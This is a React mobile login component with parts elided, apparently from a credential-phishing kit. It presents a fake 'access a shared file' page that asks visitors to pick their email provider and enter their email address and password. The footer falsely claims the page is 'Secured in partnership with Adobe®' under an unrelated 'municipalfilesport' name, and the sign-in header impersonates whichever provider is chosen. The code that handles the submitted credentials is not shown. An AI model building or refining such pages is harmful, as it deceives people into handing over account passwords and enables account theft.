...
const MobileLoginPage: React.FC<LoginPageProps> = ({ 
  ...
  return (
    <div 
      className="h-screen flex flex-col font-sans bg-cover bg-center overflow-hidden"
      style={{
    ...
    >
      {!selectedProvider ? (
        ...
        <div className="h-full flex flex-col">
          <div className="bg-white/50 backdrop-blur-sm p-4 text-center">
          ...
          <div className="flex-1 flex flex-col p-4">
            <p className="text-center text-sm font-bold text-gray-900 mb-4 drop-shadow-[0_1px_3px_rgba(255,255,255,0.8)]">Choose your email provider</p>
            <div className="flex-1 flex flex-col justify-center space-y-2 max-h-[400px]">
              {emailProviders.map((provider) => (
                ...
                >
                  <div className="flex items-center px-3 py-2.5 bg-white/75 backdrop-blur-md rounded-xl border border-white/40 active:bg-white/90 active:scale-[0.98] transition-all duration-200 shadow-lg">
                    <img src={provider.logo} alt={provider.name} className="w-5 h-5 object-contain flex-shrink-0 drop-shadow-sm" />
                    <span className="flex-1 text-sm font-semibold text-gray-700 ml-3">
                      {provider.name}
                    </span>
            ...
            <div className="mt-4 text-center">
              <p className="text-xs text-gray-800 font-semibold drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">© 2025 municipalfilesport. Secured in partnership with Adobe®.</p>
            </div>
          </div>
        </div>
      ) : (
        ...
        <div className="h-full flex flex-col">
          <div className="bg-white/50 backdrop-blur-sm p-4 text-center">
            ...
            <h1 className="text-lg font-bold text-gray-900">Sign in with {selectedProvider}</h1>
            <p className="text-gray-800 mt-1 text-sm font-medium">
              to access <span className="font-bold text-gray-900">{fileName}</span>
            </p>
          </div>

          <div className="flex-1 bg-white/60 backdrop-blur-md rounded-t-3xl shadow-2xl p-5 border-t border-white/30 overflow-y-auto">
            <button onClick={handleBackToProviders} className="flex items-center gap-2 text-sm text-gray-700 active:text-gray-900 font-medium mb-5">
              <ArrowLeft className="w-4 h-4" />
              Change provider
            </button>

            <form onSubmit={handleSubmit} className="space-y-4">
              {errorMessage && ( <div className="bg-red-100/90 backdrop-blur-sm text-red-700 p-2.5 rounded-lg text-sm font-medium text-center border border-red-200/50"> {errorMessage} </div> )}
              <div>
                <label className="text-sm font-bold text-gray-700" htmlFor="email">Email Address</label>
                <div className="relative mt-1.5">
                  <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 w-4 h-4" />
                  <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full pl-10 pr-3 py-3 bg-white/80 backdrop-blur-sm border-2 border-white/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition text-sm" />
                </div>
              </div>
              <div>
                ...
                <div className="relative mt-1.5">
                  ...
                  <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full pl-10 pr-10 py-3 bg-white/80 backdrop-blur-sm border-2 border-white/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition text-sm" />
              ...
              <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-3 px-4 rounded-xl font-bold text-white bg-blue-600/90 backdrop-blur-sm hover:bg-blue-700/90 disabled:opacity-50 transition-colors shadow-lg shadow-blue-500/30 text-sm">
                {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
                {isLoading ? 'Verifying...' : 'Sign In'}
              </button>
            </form>
          </div>
          <div className="bg-white/30 backdrop-blur-sm py-2">
